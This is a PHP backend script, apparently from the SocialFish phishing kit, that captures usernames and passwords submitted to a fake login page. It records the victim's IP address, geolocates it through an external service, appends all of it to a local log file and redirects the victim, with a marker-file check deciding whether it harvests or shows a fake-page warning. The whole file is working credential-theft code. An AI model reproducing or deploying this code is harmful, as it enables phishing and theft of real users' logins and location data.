<?php
$var = $_POST['UsernameForm'];
$var2 = $_POST['PasswordForm'];

if (!empty($_SERVER['HTTP_CLIENT_IP']))   
    {
      $remote = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    {
      $remote = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $remote = $_SERVER['REMOTE_ADDR'];
    }
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=".$remote));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>There's a Phishing Page generated by SocialFish in this website.</title></html>";
if($myFile == $searchString) {
    file_put_contents("cat.txt", " <user>: " . $var . "\n  <pass>: " . $var2 . "\n  <ip>: " . $remote . "\n <country>: " . $country . "\n  <city>: " . $city . "\n", FILE_APPEND);
    header('Location: <CUST0M>');
}
if($myFile != $searchString) {
    echo "***ALERT! I AM A FAKE PAGE | DO NOT TRUST ME";
}
exit();
?>
